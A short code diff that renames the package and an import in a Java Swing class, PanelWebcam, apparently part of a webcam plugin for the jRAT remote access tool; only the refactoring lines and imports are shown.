@@ -1,4 +1,4 @@
-package pro.jrat.plugin.webcam.client;
+package io.jrat.plugin.webcam.client;
 
 import java.awt.Color;
 import java.awt.event.ActionEvent;
@@ -23,7 +23,7 @@ import javax.swing.ScrollPaneConstants;
 import javax.swing.SpinnerNumberModel;
 import javax.swing.SwingConstants;
 
-import pro.jrat.api.BaseControlPanel;
+import jrat.api.BaseControlPanel;
 
 @SuppressWarnings("serial")
 public class PanelWebcam extends BaseControlPanel {
